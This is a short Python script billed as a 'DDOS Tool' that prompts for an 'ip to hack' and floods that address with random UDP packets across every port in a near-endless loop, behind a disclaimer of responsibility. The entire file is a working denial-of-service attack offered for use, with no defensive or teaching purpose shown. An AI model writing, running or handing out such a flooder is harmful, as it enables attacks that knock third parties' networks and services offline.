import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    GREEN = '\033[32m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


print(f"{bcolors.WARNING}\nWe are not responsible for anything take it at your own risk!!\n")
time.sleep(1.5)
print(f"{bcolors.GREEN}Attack Started")
time.sleep(1)
print("DDOS Tool by Valhallaboi")
time.sleep(1)
ip = input("ip to hack: ")
port = 1
sent = 0
for i in range(999999999):
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("packet: %s, ip: %s, port: %s" % (sent, ip, port))
    if port == 65534:
        port = 1
print("done")